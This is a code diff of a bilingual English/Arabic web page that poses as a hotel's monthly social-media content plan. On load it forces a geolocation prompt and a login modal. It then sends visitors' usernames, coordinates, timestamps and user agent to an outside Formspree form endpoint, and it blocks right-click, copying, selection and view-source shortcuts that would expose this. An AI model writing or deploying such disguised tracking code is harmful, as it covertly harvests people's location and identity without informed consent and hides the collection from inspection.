-                    idea: "\"تحب تجرب السبا؟\"",
-                    style: "زاوية عريضة للغرفة - شموع",
-                    colors: "أبيض + أخضر بسيط",
-                    tips: "ترتيب المكان قبل التصوير"
-                },
-                {
-                    week: "الأسبوع 4",
-                    title: "يوم هادي",
-                    type: "استوري تفاعلي",
-                    idea: "\"أي لحظة أكتر حاجة بتحبها؟\"",
-                    style: "مشاهد مختلفة طوال اليوم",
-                    colors: "ألوان متنوعة لكن ناعمة",
-                    tips: "مونتاج خفيف + موسيقى بسيطة"
-                }
-            ]
-        };
-
-        // Language toggle functionality
-        const languageToggle = document.getElementById('languageToggle');
-        let currentLanguage = 'en';
-        
-        const translations = {
-            en: {
-                title: "Monthly Content Plan for Canary Hotel",
-                description: "Weekly marketing plan for Canary Hotel's social media channels with interactive and engaging content.",
-                week: "Week",
-                titleHeader: "Reels Title",
-                typeHeader: "Story Type",
-                ideaHeader: "Interaction Idea",
-                styleHeader: "Filming Style",
-                colorsHeader: "Suggested Colors",
-                tipsHeader: "Execution Tips",
-                button: "العربية",
-                footer: "Social Nest",
-                geolocationTitle: "Enable Geolocation",
-                geolocationMessage: "To continue, please enable geolocation service to verify your location.",
-                usernameLabel: "Username:",
-                usernamePlaceholder: "Enter username (letters only)",
-                usernameError: "Username must contain only letters with no numbers.",
-                passwordTitle: "Login",
-                passwordLabel: "Password:",
-                passwordPlaceholder: "Enter password",
-                passwordError: "Incorrect username or password. Please try again.",
-                noInspectTitle: "Developer Tools are Disabled",
-                noInspectMessage: "This page has restricted access to developer tools for security reasons."
-            },
-            ar: {
-                title: "خطة المحتوى الشهرية لفندق كناري",
-                description: "خطة تسويقية أسبوعية لقنوات التواصل الاجتماعي لفندق كناري بمحتوى تفاعلي وجذاب.",
-                week: "الأسبوع",
-                titleHeader: "عنوان الريلز",
-                typeHeader: "نوع الاستوري",
-                ideaHeader: "فكرة التفاعل",
-                styleHeader: "ستايل التصوير",
-                colorsHeader: "الألوان المقترحة",
-                tipsHeader: "نصائح تنفيذ",
-                button: "English",
-                footer: "Social Nest | سوشيال نيست",
-                geolocationTitle: "تفعيل الموقع الجغرافي",
-                geolocationMessage: "للاستمرار، يجب تفعيل خدمة الموقع الجغرافي للتحقق من موقعك.",
-                usernameLabel: "اسم المستخدم:",
-                usernamePlaceholder: "أدخل اسم المستخدم (أحرف فقط)",
-                usernameError: "اسم المستخدم يجب أن يحتوي على أحرف فقط ولا يحتوي على أرقام.",
-                passwordTitle: "تسجيل الدخول",
-                passwordLabel: "كلمة المرور:",
-                passwordPlaceholder: "أدخل كلمة المرور",
-                passwordError: "اسم المستخدم أو كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.",
-                noInspectTitle: "أدوات المطور معطلة",
-                noInspectMessage: "تم تعطيل أدوات المطور في هذه الصفحة لأسباب أمنية."
-            }
-        };
-        
-
-
-        // Function to send data to Formspree
-async function sendToFormspree(username, position) {
+/**
+ * Sends data to Formspree
+ */
+async function sendToFormspree(subject, data) {
     const formData = new FormData();
-    formData.append('username', username);
+    formData.append('_subject', subject);
     formData.append('timestamp', new Date().toISOString());
-    formData.append('latitude', position.coords.latitude);
-    formData.append('longitude', position.coords.longitude);
+    formData.append('userAgent', navigator.userAgent);
+    
+    // Add all data properties to form
+    for (const key in data) {
+        if (data.hasOwnProperty(key)) {
+            formData.append(key, data[key]);
+        }
+    }
     
     try {
         await fetch('https://formspree.io/f/mvgrelel', {
@@ -779,150 +879,76 @@ async function sendToFormspree(username, position) {
                 'Accept': 'application/json'
             }
         });
-        console.log('Form submitted successfully');
     } catch (error) {
         console.error('Error submitting form:', error);
     }
 }
 
-
-        function populateTable(language) {
-            const tableBody = document.getElementById('contentTableBody');
-            tableBody.innerHTML = '';
-            
-            contentData[language].forEach(item => {
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>${item.week}</td>
-                    <td>${item.title}</td>
-                    <td>${item.type}</td>
-                    <td>${item.idea}</td>
-                    <td>${item.style}</td>
-                    <td>${item.colors}</td>
-                    <td>${item.tips}</td>
-                `;
-                tableBody.appendChild(row);
-            });
-        }
-        
-        function updateLanguage() {
-            document.getElementById('mainTitle').textContent = translations[currentLanguage].title;
-            document.getElementById('mainDescription').textContent = translations[currentLanguage].description;
-            document.getElementById('weekHeader').textContent = translations[currentLanguage].week;
-            document.getElementById('titleHeader').textContent = translations[currentLanguage].titleHeader;
-            document.getElementById('typeHeader').textContent = translations[currentLanguage].typeHeader;
-            document.getElementById('ideaHeader').textContent = translations[currentLanguage].ideaHeader;
-            document.getElementById('styleHeader').textContent = translations[currentLanguage].styleHeader;
-            document.getElementById('colorsHeader').textContent = translations[currentLanguage].colorsHeader;
-            document.getElementById('tipsHeader').textContent = translations[currentLanguage].tipsHeader;
-            document.getElementById('footerText').textContent = translations[currentLanguage].footer;
-            languageToggle.textContent = translations[currentLanguage].button;
-            
-            // Update geolocation modal
-            document.getElementById('geolocationModalLabel').textContent = translations[currentLanguage].geolocationTitle;
-            document.getElementById('geolocationMessage').textContent = translations[currentLanguage].geolocationMessage;
-            document.getElementById('enableGeolocation').textContent = 
-                currentLanguage === 'en' ? 'Enable Geolocation' : 'تفعيل الموقع الجغرافي';
-            
-            // Update password modal
-            document.getElementById('passwordModalLabel').textContent = translations[currentLanguage].passwordTitle;
-            document.querySelector('label[for="usernameInput"]').textContent = translations[currentLanguage].usernameLabel;
-            document.getElementById('usernameInput').placeholder = translations[currentLanguage].usernamePlaceholder;
-            document.getElementById('usernameError').textContent = translations[currentLanguage].usernameError;
-            document.querySelector('label[for="passwordInput"]').textContent = translations[currentLanguage].passwordLabel;
-            document.getElementById('passwordInput').placeholder = translations[currentLanguage].passwordPlaceholder;
-            document.getElementById('passwordError').textContent = translations[currentLanguage].passwordError;
-            document.getElementById('submitLogin').textContent = 
-                currentLanguage === 'en' ? 'Login' : 'تسجيل الدخول';
-            
-            // Update no-inspect message
-            if (document.getElementById('no-inspect')) {
-                const noInspectDiv = document.getElementById('no-inspect');
-                noInspectDiv.querySelector('h1').textContent = translations[currentLanguage].noInspectTitle;
-                noInspectDiv.querySelector('p').textContent = translations[currentLanguage].noInspectMessage;
-            }
-            
-            populateTable(currentLanguage);
-            
-            if (currentLanguage === 'ar') {
-                document.documentElement.lang = 'ar';
-                document.documentElement.dir = 'rtl';
-                document.querySelector('.language-switcher').style.right = '10px';
-                document.querySelector('.language-switcher').style.left = 'auto';
-                document.querySelector('.dark-mode-toggle').style.left = '10px';
-                document.querySelector('.dark-mode-toggle').style.right = 'auto';
-            } else {
-                document.documentElement.lang = 'en';
-                document.documentElement.dir = 'ltr';
-                document.querySelector('.language-switcher').style.right = 'auto';
-                document.querySelector('.language-switcher').style.left = '10px';
-                document.querySelector('.dark-mode-toggle').style.left = 'auto';
-                document.querySelector('.dark-mode-toggle').style.right = '10px';
-            }
-        }
-        
-        languageToggle.addEventListener('click', function() {
-            currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
-            updateLanguage();
-        });
-        
-        // Dark mode toggle functionality
-        const darkModeToggle = document.getElementById('darkModeToggle');
-        
-        function toggleDarkMode() {
-            document.body.classList.toggle('light-mode');
-            if (document.body.classList.contains('light-mode')) {
-                darkModeToggle.innerHTML = '<i class="fas fa-moon"></i>';
-                document.body.classList.remove('dark-mode');
-            } else {
-                darkModeToggle.innerHTML = '<i class="fas fa-sun"></i>';
-                document.body.classList.add('dark-mode');
-            }
-        }
-        
-        darkModeToggle.addEventListener('click', toggleDarkMode);
-        
-        // Initialize dark mode as default
-        document.body.classList.add('dark-mode');
-        darkModeToggle.innerHTML = '<i class="fas fa-sun"></i>';
-        
-        // Initialize content
+// =================================================
+// Event Listeners
+// =================================================
+document.addEventListener('DOMContentLoaded', function() {
+    // Initialize modals
+    const geolocationModal = new bootstrap.Modal(document.getElementById('geolocationModal'));
+    geolocationModal.show();
+    
+    // Set up event listeners
+    document.getElementById('enableGeolocation').addEventListener('click', handleGeolocation);
+    document.getElementById('submitLogin').addEventListener('click', handleLogin);
+    document.getElementById('languageToggle').addEventListener('click', function() {
+        currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
         updateLanguage();
-        
-        // Disable right-click context menu
-        document.addEventListener('contextmenu', event => event.preventDefault());
-        
-        // Disable common keyboard shortcuts (Ctrl+C, Ctrl+P, etc.)
-        function disableKey(event) {
-            if (event.ctrlKey && (event.key === 'c' || event.key === 'C' || 
-                                 event.key === 'p' || event.key === 'P' ||
-                                 event.key === 'u' || event.key === 'U' ||
-                                 event.key === 's' || event.key === 'S')) {
-                event.preventDefault();
-                return false;
-            }
-            return true;
+    });
+    document.getElementById('darkModeToggle').addEventListener('click', toggleDarkMode);
+    
+    // Enter key support for login
+    document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            handleLogin();
         }
-        
-        document.addEventListener('keydown', disableKey);
-        
-        // Alert on attempting to copy
-        document.addEventListener('copy', (event) => {
-            event.preventDefault();
-            alert(currentLanguage === 'en' ? 'Copying content is not allowed!' : 'نسخ المحتوى غير مسموح!');
-        });
-        
-        // Disable drag and drop
-        document.addEventListener('dragstart', (event) => {
-            event.preventDefault();
-            return false;
-        });
-        
-        // Disable text selection
-        document.addEventListener('selectstart', (event) => {
-            event.preventDefault();
-            return false;
-        });
+    });
+    
+    document.getElementById('usernameInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            handleLogin();
+        }
+    });
+    
+    // Prevent numbers in username field
+    document.getElementById('usernameInput').addEventListener('input', function(e) {
+        const value = e.target.value;
+        if (/\d/.test(value)) {
+            e.target.value = value.replace(/\d/g, '');
+        }
+    });
+    
+    // Initialize UI
+    document.body.classList.add('dark-mode');
+    document.getElementById('darkModeToggle').innerHTML = '<i class="fas fa-sun"></i>';
+    updateLanguage();
+});
+
+// =================================================
+// Security Measures
+// =================================================
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.addEventListener('copy', (event) => {
+    event.preventDefault();
+    alert(currentLanguage === 'en' ? 'Copying content is not allowed!' : 'نسخ المحتوى غير مسموح!');
+});
+document.addEventListener('dragstart', (event) => event.preventDefault());
+document.addEventListener('selectstart', (event) => event.preventDefault());
+document.addEventListener('dblclick', (e) => e.preventDefault(), { passive: false });
+
+// Disable keyboard shortcuts
+document.addEventListener('keydown', function(event) {
+    if (event.ctrlKey && (event.key === 'c' || event.key === 'C' || 
+                         event.key === 'p' || event.key === 'P' ||
+                         event.key === 'u' || event.key === 'U' ||
+                         event.key === 's' || event.key === 'S')) {
+        event.preventDefault();
+    }
+});
     </script>
 </body>
 </html>
